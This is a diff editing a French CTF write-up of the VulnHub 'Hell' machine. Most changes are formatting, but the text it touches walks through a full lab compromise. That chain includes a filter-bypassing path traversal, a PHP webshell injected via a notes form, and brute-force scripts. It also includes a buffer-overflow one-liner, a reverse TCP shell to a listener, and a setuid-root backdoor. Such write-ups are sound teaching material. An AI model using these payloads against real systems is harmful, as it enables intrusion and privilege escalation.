@@ -59,13 +59,13 @@ SF:\x20webserver\x20\(echoserver\.bak\)\.\.\.\nStarting\x20echo\x20server\
 MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)
 ```
 
-Il y a donc un service fait-maison sur le port 666 ainsi que deux URLs à fouiller présentes dans le *robots.txt*.  
+Il y a donc un service fait-maison sur le port 666 ainsi que deux URLs à fouiller présentes dans le `robots.txt`.  
 
-L'URL */personal/* est le site d'un fan-club de *g0tmi1k* (le créateur de *VulnHub*).  
+L'URL `/personal/` est le site d'un fan-club de *g0tmi1k* (le créateur de *VulnHub*).  
 
 ![g0tmi1k fan club](/assets/img/hell_1.png)
 
-Sur l'URL */super\_secret\_login\_path\_muhahaha/* on tombe sur une section *"Admin"* demandant des identifiants.  
+Sur l'URL `/super_secret_login_path_muhahaha/` on tombe sur une section *"Admin"* demandant des identifiants.  
 
 Ni *Wapiti* ni *sqlmap* ne trouvent de moyen d'exploiter le formulaire de login.  
 
@@ -74,7 +74,7 @@ Ni *Wapiti* ni *sqlmap* ne trouvent de moyen d'exploiter le formulaire de login.
 
 Tournons-nous vers ce mystérieux port 666 :  
 
-```bash
+```console
 $ ncat 192.168.1.29 666 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Connected to 192.168.1.29:666.
@@ -87,18 +87,18 @@ yop
 ^C
 ```
 
-Il s'agit bien d'un serveur de type *echo* : on soumet quelque chose et cela nous est retourné.  
+Il s'agit bien d'un serveur de type `echo` : on soumet quelque chose et cela nous est retourné.  
 
-Un message indique que le programme est archivé sur le serveur web et effectivement on trouve à la racine un fichier *echoserver.bak*.  
+Un message indique que le programme est archivé sur le serveur web et effectivement on trouve à la racine un fichier `echoserver.bak`.  
 
-```bash
+```console
 $ file echoserver.bak 
 echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=e8d0c6cce9504db15d02078b96e4b95e108e2aa2, not stripped
 ```
 
-Bonne nouvelle, le fichier est dynamiquement linké et non strippé, ce ne sera pas aussi compliqué que [le display\_key du CTF Hades]({% link _posts/2014-05-23-solution-du-ctf-hades-de-vulnhub.md %}) :p
+Bonne nouvelle, le fichier est dynamiquement linké et non strippé, ce ne sera pas aussi compliqué que [le display_key du CTF Hades]({% link _posts/2014-05-23-solution-du-ctf-hades-de-vulnhub.md %}) :p
 
-```bash
+```console
 $ nm echoserver.bak 
                  U accept@@GLIBC_2.2.5
                  U bind@@GLIBC_2.2.5
@@ -144,11 +144,11 @@ $ nm echoserver.bak
                  U write@@GLIBC_2.2.5
 ```
 
-En supposant qu'il y ait un buffer overflow on voit que *strcpy()* n'est pas importée, mais le *read()* est peut-être faillible.  
+En supposant qu'il y ait un buffer overflow on voit que `strcpy()` n'est pas importée, mais le `read()` est peut-être faillible.  
 
 J'ai récupéré le programme [checksec](http://www.trapkit.de/tools/checksec.html) qui permet de connaître les mécanismes de protection présents sur un binaire ELF.  
 
-```bash
+```console
 $ checksec.sh --file echoserver.bak
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   echoserver.bak
@@ -156,9 +156,9 @@ No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RU
 
 *NX* est activé et on ne sait pas si le système est configuré en *ASLR*... ça commence mal.  
 
-Le programme est court et tout a lieu dans le main() :  
+Le programme est court et tout a lieu dans le `main()` :  
 
-```
+```nasm
    0x000000000040071c <main+0>:   push   %rbp
    0x000000000040071d <main+1>:   mov    %rsp,%rbp
    0x0000000000400720 <main+4>:   sub    $0x600,%rsp
@@ -220,36 +220,36 @@ loop:
 
 Pour vous donner une idée de la stack et des variables locales on a donc :  
 
-%rbp-0x4 : socket server  
+`%rbp-0x4` : socket server  
 
-%rbp-0x8 : socket client  
+`%rbp-0x8` : socket client  
 
-%rbp-0x5f0 : buffer (length = 0x5f0 - 0x8 = 1512)  
+`%rbp-0x5f0` : buffer (length = 0x5f0 - 0x8 = 1512)  
 
-%rbp-0x5fc : resultat htons 1  
+`%rbp-0x5fc` : résultat htons 1  
 
-%rbp-0x5fe : resultat htons 2  
+`%rbp-0x5fe` : résultat htons 2  
 
-%rbp-0x600 : struct sockaddr \*  
+`%rbp-0x600` : struct sockaddr *  
 
-On voit que la taille allouée au buffer de lecture est de 1512 octets or le programme *read()* 2000 octets.  
+On voit que la taille allouée au buffer de lecture est de 1512 octets or le programme `read()` 2000 octets.  
 
-Il y a encore une autre difficulté qui est que l'on est dans le *main* lors de l'exploitation et non dans une fonction...  
+Il y a encore une autre difficulté qui est que l'on est dans le `main` lors de l'exploitation et non dans une fonction...  
 
-Vous avez aussi du remarquer, en dehors du fait qu'il s'agit d'assembleur 64bits, que le programme ne *fork()* pas à la connexion d'un client : il est mono client.  
+Vous avez aussi du remarquer, en dehors du fait qu'il s'agit d'assembleur 64bits, que le programme ne `fork()` pas à la connexion d'un client : il est mono client.  
 
-En fait si on écrase le tampon on voit dans la console de la VM une exception Python dans */root/echoserver.py* ainsi qu'un message de segfault sur la socket. Il y a donc (vraisemblablement, vous verrez plus loin) un wrapper qui se charge de relancer le programme en boucle.  
+En fait si on écrase le tampon on voit dans la console de la VM une exception Python dans `/root/echoserver.py` ainsi qu'un message de segfault sur la socket. Il y a donc (vraisemblablement, vous verrez plus loin) un wrapper qui se charge de relancer le programme en boucle.  
 
 Pour terminer sur le sujet, je ne suis pas parvenu à faire segfaulter le programme sur mon système *openSUSE* donc impossible de reproduire le crash qui semble avoir lieu sur la VM :(  
 
-Comme il est possible d'écraser la socket client on peut par exemple rediriger nos données vers la sortie standard du programme. En supposant que la sortie du programme soit par exemple redirigée vers un bash ou un Python il y a peut être une faille type shell-escape... Mais je ne suis pas parvenu à faire exécuter quoi que ce soit.  
+Comme il est possible d'écraser le socket client, on peut par exemple rediriger nos données vers la sortie standard du programme. En supposant que la sortie du programme soit par exemple redirigée vers un bash ou un Python il y a peut-être une faille type shell-escape... Mais je ne suis pas parvenu à faire exécuter quoi que ce soit.  
 
 Du coup j'ai assez vite laissé tombé (et j'ai eu raison).  
 
 All work and no play makes Jack a dull boy
 ------------------------------------------
 
-Comme vu plus tôt, le path *super\_secret* pointe vers une page de login. Un petit coup de *dirb* révèle l'existence de scripts supplémentaires :  
+Comme vu plus tôt, le path `super_secret` pointe vers une page de login. Un petit coup de `dirb` révèle l'existence de scripts supplémentaires :  
 
 ```
 http://192.168.1.29/super_secret_login_path_muhahaha/check.php
@@ -264,19 +264,19 @@ http://192.168.1.29/super_secret_login_path_muhahaha/users.php
 http://192.168.1.29/super_secret_login_path_muhahaha/1
 ```
 
-Le fichier *check.php* redirige vers *index.php* en définissant au passage un cookie *failcount* qui est incrémenté à chaque passage.  
+Le fichier `check.php` redirige vers `index.php` en définissant au passage un cookie `failcount` qui est incrémenté à chaque passage.  
 
-Le fichier *notes.php* nous invite à saisir une note qui est visiblement enregistrée sur le disque :  
+Le fichier `notes.php` nous invite à saisir une note qui est visiblement enregistrée sur le disque :  
 
 > "note.txt stored to temporary storage upon submission"
 
-Le fichier *users.php* renvoie juste "Jack".  
+Le fichier `users.php` renvoie juste "Jack".  
 
-Le fichier 1 renvoie juste "INTRUDER ALERT!". Après avoir testé avec .html et .php il apparaît effectivement que ce fichier n'a pas d'extension (c'est pas du *mod\_rewrite* ou autre).  
+Le fichier 1 renvoie juste "INTRUDER ALERT!". Après avoir testé avec .html et .php il apparaît effectivement que ce fichier n'a pas d'extension (ce n'est pas du `mod_rewrite` ou autre).  
 
-Avec un œil plus attentif (*Wireshark* etc) on s’aperçoit que certaines pages redirigent mais renvoient tout de même un contenu.  
+Avec un œil plus attentif (*Wireshark* etc) on s’aperçoit que certaines pages redirigent, mais renvoient tout de même un contenu.  
 
-Pour récupérer ce contenu on peut utiliser *Wireshark* ou exploiter *requests* pour obtenir ce contenu. Mettons que l'on a préalablement placé les urls dans le fichier *urls.txt*, le script suivant fera notre travail :  
+Pour récupérer ce contenu, on peut utiliser *Wireshark* ou exploiter *requests* pour obtenir ce contenu. Mettons que l'on a préalablement placé les urls dans le fichier `urls.txt`, le script suivant fera notre travail :  
 
 ```python
 import requests
@@ -294,7 +294,7 @@ for url in lines:
     print "==============================="
 ```
 
-Les résultats intéressant concernent *panel.php* qui retourne :
+Les résultats intéressants concernent `panel.php` qui retourne :
 
 ```html
 <HTML>
@@ -319,7 +319,7 @@ Les résultats intéressant concernent *panel.php* qui retourne :
 </HTML>
 ```
 
-et *personal.php* :  
+et `personal.php` :  
 
 ```html
 <HTML>
@@ -340,7 +340,7 @@ et *personal.php* :
 </HTML>
 ```
 
-dans un premier temps j'ai essayé de brute-forcer les deux formulaires de login (*login.php* et *check.php*) avec les scripts respectifs suivants :  
+Dans un premier temps, j'ai essayé de brute-forcer les deux formulaires de login (`login.php` et `check.php`) avec les scripts respectifs suivants :  
 
 ```python
 import requests
@@ -438,23 +438,23 @@ while True:
 fd.close()
 ```
 
-Mais que ce soit avec *admin* ou *Jack* je n'ai eu aucun résultat valide :(  
+Mais que ce soit avec `admin` ou `Jack` je n'ai eu aucun résultat valide :(  
 
-J'ai fouiné toujours plus et remarqué que lorsque l'on dépasse une certains quantité de *failcount*, le serveur retourne un cookie *intruder=1*.  
+J'ai fouiné toujours plus et remarqué que lorsque l'on dépasse une certaine quantité de `failcount`, le serveur retourne un cookie `intruder=1`.  
 
-Et si on demande *panel.php* avec ce cookie défini on découvre que du code html supplémentaire est ajouté à la fin avec *"INTRUDER ALERT!"* :)  
+Et si on demande `panel.php` avec ce cookie défini on découvre que du code html supplémentaire est ajouté à la fin avec *"INTRUDER ALERT!"* :)  
 
-Il y a donc fort à parier que le script fait un bête *include()* de la valeur du cookie *intruder* (rappelez-vous le fichier dont le nom est *1*).  
+Il y a donc fort à parier que le script fait un bête `include()` de la valeur du cookie *intruder* (rappelez-vous le fichier dont le nom est *1*).  
 
-Et effectivement si on défini ce cookie à *"server.php"* la page *server.php* se retrouve dans *panel.php*.  
+Et effectivement si on définit ce cookie à `server.php` la page `server.php` se retrouve dans `panel.php`.  
 
-Seulement... */etc/passwd* ne passe pas et *../../../../../../../etc/passwd* non plus. Etonnant car par exemple *./server.php* fonctionne.  
+Seulement... `/etc/passwd` ne passe pas et `../../../../../../../etc/passwd` non plus. Etonnant car par exemple `./server.php` fonctionne.  
 
-Vraisemblablement il y a un filtre qui doit retirer les tentatives de remontée d'arborescence.  
+Vraisemblablement, il y a un filtre qui doit retirer les tentatives de remontée d'arborescence.  
 
-Si on met *intruder=../server.php* alors BANG ! On retrouve *server.php* qui est dans le dossier local !  
+Si on met `intruder=../server.php` alors BANG ! On retrouve `server.php` qui est dans le dossier local !  
 
-Le script fait en réalité un *str\_replace* tout bête et si on passe *....//....//....//....//....//....//....//....//etc/passwd* j'obtiens :  
+Le script fait en réalité un `str_replace` tout bête et si on passe `....//....//....//....//....//....//....//....//etc/passwd` j'obtiens :  
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -491,7 +491,7 @@ oj:x:1005:1005::/home/oj:/bin/sh
 
 On peut donc naviguer dans l'arborescence. Qui plus est, on a obtenu des usernames supplémentaires (mais les scripts de brute-force ne donnent rien de plus pour autant).  
 
-Je réutilise la technique d'énumération via *include(*) employée sur le [LAMPSecurity CTF4]({% link _posts/2014-07-08-Solution-du-CTF-LAMPSecurity-CTF4.md %}), en adaptant le script au point d'injection :  
+Je réutilise la technique d'énumération via `include()` employée sur le [LAMPSecurity CTF4]({% link _posts/2014-07-08-Solution-du-CTF-LAMPSecurity-CTF4.md %}), en adaptant le script au point d'injection :  
 
 ```python
 import requests
@@ -539,9 +539,9 @@ Contenu trouve avec /var/log/faillog
 
 Pas d'accès à des logs *Apache*... Comment transformer notre faille include en RCE (remote code execution) ?  
 
-La réponse c'est le *notes.php* qui disait stocker *note.txt* dans un "stockage temporaire".  
+La réponse, c'est le `notes.php` qui disait stocker `note.txt` dans un "stockage temporaire".  
 
-Et effectivement si on passe *<?php system($\_get["cmd"]); ?>* à *notes.php* et que l'on utilise ensuite la faille *intruder* pour inclure */tmp/note.txt* alors on peut bien passer des commandes.  
+Et effectivement si on passe `<?php system($_get["cmd"]); ?>` à `notes.php` et que l'on utilise ensuite la faille *intruder* pour inclure `/tmp/note.txt` alors on peut bien passer des commandes.  
 
 Encore un peu de code pour cracher une invite de commande pseudo-interactive :  
 
@@ -564,7 +564,7 @@ while True:
     print r.content[136:-9]
 ```
 
-Dans *login.php* on trouve un identifiant correspondant à *Jack* :  
+Dans `login.php` on trouve un identifiant correspondant à *Jack* :  
 
 ```php
 <?PHP
@@ -599,7 +599,7 @@ if (login()) {
 
 Ce dernier nous permet une connexion SSH :  
 
-```bash
+```console
 jack@hell:~$ ls -alR 
 .:
 total 28
@@ -645,7 +645,7 @@ Pwn 4 Life
 
 *Jack* est un petit cachottier qui chiffre ses mails (la *NSA* te surveille *Jack* !).  
 
-```bash
+```console
 jack@hell:~$ cat .pgp/note 
 The usual password as with everything.
 
@@ -667,9 +667,9 @@ svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
 -----END PGP MESSAGE-----
 ```
 
-Au passage on a les permissions suffisantes pour lire un mail de *George* :  
+Au passage, on a les permissions suffisantes pour lire un mail de *George* :  
 
-```bash
+```console
 jack@hell:~$ cat /var/mail/george/signup.eml 
 From: admin@rockyou.com
 To: super_admin@hell.com
@@ -683,7 +683,7 @@ Thanks for signing up for your account. I hope you enjoy our services.
 
 Continuons notre exploration en nous concentrant sur *George* :  
 
-```bash
+```console
 jack@hell:~$ cat /etc/aliases
 # /etc/aliases
 mailer-daemon: postmaster
@@ -703,7 +703,7 @@ root: george
 
 On dirait que *George* va être notre passerelle vers root.  
 
-```bash
+```console
 jack@hell:~$ find / -user george 2> /dev/null 
 /home/george
 /usr/bin/game.py
@@ -754,7 +754,7 @@ COMMIT
 
 J'ai eu recours à [mon script Python de scan de port]({% link _posts/2011-01-04-dvscan.py-Un-scanneur-de-port-en-Python.md %}) que j'utilise deux fois l'an :  
 
-```bash
+```console
 jack@hell:/tmp$ python dvscan.py 127.0.0.1
 dvscan.py 1.0
 Launching scan on localhost ['127.0.0.1']
@@ -775,11 +775,11 @@ Port ouverts :
 3306 : mysql
 ```
 
-De toute évidence il est temps de se concentrer sur ce message chiffré. Vu qu'on dispose de la paire de clés (et c'est bien d'avoir la paire entière...) ça ne devrait pas poser de problèmes.  
+De toute évidence, il est temps de se concentrer sur ce message chiffré. Vu qu'on dispose de la paire de clés (et c'est bien d'avoir la paire entière...) ça ne devrait pas poser de problèmes.  
 
-Bien que la clé soit marquée *PGP* il est possible de l'importer dans *GnuPG* via *--import* :  
+Bien que la clé soit marquée *PGP* il est possible de l'importer dans *GnuPG* via `--import` :  
 
-```bash
+```console
 $ gpg --import public.pkr
 gpg: clef 3F18AB0A : clef publique « jack@cowlovers.com » importée
 gpg:       Quantité totale traitée : 1
@@ -810,7 +810,7 @@ The password is '4J0WWvL5nS'
 What else ?
 -----------
 
-Une fois connecté en tant que *milk\_4\_life* on voit un exécutable setuid george :  
+Une fois connecté en tant que `milk_4_life` on voit un exécutable setuid george :  
 
 ```
 ---s--x--x 1 george george 5743 Jun 19 18:24 game
@@ -818,14 +818,14 @@ Une fois connecté en tant que *milk\_4\_life* on voit un exécutable setuid geo
 
 Quand on lance le programme il semble se mettre en écoute :  
 
-```bash
+```console
 milk_4_life@hell:~$ ./game 
 I'm listening
 ```
 
 Si on relance un scan de ports il y en a un de plus :  
 
-```bash
+```console
 jack@hell:/tmp$ python dvscan.py 127.0.0.1
 --- snip ---
 Port ouverts :
@@ -901,7 +901,7 @@ I hear the faint sound of chmodding.......
 
 On recherche les fichiers dont le statut a récemment changé sur le disque :  
 
-```bash
+```console
 milk_4_life@hell:~$ find /  -newerct '2014-07-12 14:10' 2> /dev/null  | grep -v /proc
 /usr/bin/lesson101
 /var/log/auth.log
@@ -909,7 +909,7 @@ milk_4_life@hell:~$ find /  -newerct '2014-07-12 14:10' 2> /dev/null  | grep -v 
 /tmp
 ```
 
-Le binaire *lesson101* est devenu setuid george (*George is inside !!!*)  
+Le binaire `lesson101` est devenu setuid george (*George is inside !!!*)  
 
 ```
 ---s--x--x 1 george george 6531 Jun 19 15:13 /usr/bin/lesson101
@@ -917,7 +917,7 @@ Le binaire *lesson101* est devenu setuid george (*George is inside !!!*)
 
 Reprenons une leçon avec *George* :  
 
-```bash
+```console
 $ /usr/bin/lesson101
 Hello milk_4_life - this is a beginning exercise for the course, 'Learning Bad C - 101'
 
@@ -934,28 +934,28 @@ Name: test
 Thanks!
 ```
 
-Si on rentre un nom trop long on remarque que le programme segfaulte (du verbe segfaulter off course). Aucun fichier core n'est créé sur le système.  
+Si on rentre un nom trop long on remarque que le programme segfaulte (du verbe segfaulter of course). Aucun fichier core n'est créé sur le système.  
 
-Comme vu au dessus, on ne dispose d'aucune permission en lecture, heureusement l'ASLR n'est pas activée sur le système :  
+Comme vu au-dessus, on ne dispose d'aucune permission en lecture, heureusement l'ASLR n'est pas activée sur le système :  
 
-```bash
+```console
 milk_4_life@hell:~$ cat /proc/sys/kernel/randomize_va_space 
 0
 ```
 
 On doit donc pouvoir mettre un shellcode avec une piscine olympique de nops dans l'environnement et écraser l'adresse de retour sur la pile avec l'adresse de notre variable d'environnement.  
 
-Pour la procédure c'est la même que celle utilisée [sur le Brainpan 2]({% link _posts/2014-03-13-Solution-du-CTF-Brainpan-2-de-VulnHub.md %}).  
+Pour la procédure, c'est la même que celle utilisée [sur le Brainpan 2]({% link _posts/2014-03-13-Solution-du-CTF-Brainpan-2-de-VulnHub.md %}).  
 
-Le shellcode utilisé ici est [un reverse shell TCP](http://shell-storm.org/shellcode/files/shellcode-833.php). J'ai d'abord voulu lire un programme en Python pour communiquer avec le programme via *subprocess* mais les histoires de buffuring de la console rendent tout ça trop compliqué.  
+Le shellcode utilisé ici est [un reverse shell TCP](http://shell-storm.org/shellcode/files/shellcode-833.php). J'ai d'abord voulu lire un programme en Python pour communiquer avec le programme via `subprocess` mais les histoires de buffering de la console rendent tout ça trop compliqué.  
 
-La solution que j'ai choisi est donc de passer systèmatiquement le chiffre 10 puis l'adresse de retour avec au début un padding à agrandir au fur et à mesure des échecs (*enlarge your padding !*). Si le chiffre à deviner n'est pas dix il faut juste *Ctrl+C* puis recommencer.  
+La solution que j'ai choisi est donc de passer systématiquement le chiffre 10 puis l'adresse de retour avec au début un padding à agrandir au fur et à mesure des échecs (*enlarge your padding !*). Si le chiffre à deviner n'est pas dix il faut juste *Ctrl+C* puis recommencer.  
 
 Finalement j'obtiens mon accès avec un padding de 2 octets.  
 
 Côté victime :  
 
-```bash
+```console
 milk_4_life@hell:~$ python -c "print '10';print 'AA'+'\x77\xff\xfe\xbf'*1000" | /usr/bin/lesson101
 Hello milk_4_life - this is a beginning exercise for the course, 'Learning Bad C - 101'
 
@@ -971,7 +971,7 @@ Name:
 
 Côté attaquant :  
 
-```bash
+```console
 $ ncat -l -p 55555 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Listening on :::55555
@@ -982,9 +982,9 @@ id
 uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
 ```
 
-Un accès SSH récupéré plus tard (*authorized\_keys*) on découvre dans *.bash\_history* des références multiples à *Truecrypt*.  
+Un accès SSH récupéré plus tard (`authorized_keys`) on découvre dans *`bash_history` des références multiples à *Truecrypt*.  
 
-```bash
+```console
 george@hell:~$ sudo -l
 Matching Defaults entries for george on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -993,9 +993,9 @@ User george may run the following commands on this host:
     (root) NOPASSWD: /usr/bin/truecrypt
 ```
 
-Notez qu'un conteneur *Truecrypt* existe déjà sur le système mais les mots de passe connus ne semblent pas fonctionner :  
+Notez qu'un conteneur *Truecrypt* existe déjà sur le système, mais les mots de passe connus ne semblent pas fonctionner :  
 
-```bash
+```console
 george@hell:~$ ls -lh container.tc
 -rw------- 1 george george 4.0M Jun 19 21:09 container.tc
 ```
@@ -1007,11 +1007,11 @@ Beating Hell
 
 Comme *Truecrypt* n'est pas dans les dépôts *openSUSE* et que sa version rebadgée (*Realcrypt*) n'est pas sur un dépôt officiel j'ai choisi de lancer un *Kali Linux* dans une VM le temps de créer un conteneur *Truecrypt*.  
 
-Le principe est simple : on créé un petit container (10M) montable sous Unix avec système de fichier *ext2* (important car il doit supporter les permissions Unix). Dedans on place une backdoor setuid root puis on démonte le conteneur pour le recopier sur le système du CTF.  
+Le principe est simple : on créé un petit container (10M) montable sous Unix avec système de fichier *ext2* (important, car il doit supporter les permissions Unix). Dedans on place une backdoor setuid root puis on démonte le conteneur pour le recopier sur le système du CTF.  
 
 Après on le monte depuis *Hell* et on lance la backdoor :  
 
-```bash
+```console
 george@hell:~$ truecrypt /tmp/crypted.tc /media/truecrypt1
 Enter password for /tmp/crypted.tc: 
 Enter keyfile [none]: 
@@ -1032,9 +1032,9 @@ Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54
 Trolololololol
 --------------
 
-Parlons de trolls poilus justement ! Le système utilisé pour le CTF est une Debian 7.5 32bits. Dès lors comment se fait-il que *echoserver.bak* était en 64bits ?  
+Parlons de trolls poilus justement ! Le système utilisé pour le CTF est une Debian 7.5 32bits. Dès lors comment se fait-il que `echoserver.bak` était en 64bits ?  
 
-Voici le contenu de */root/echoserver.py* :  
+Voici le contenu de `/root/echoserver.py` :  
 
 ```python
 #!/usr/bin/python
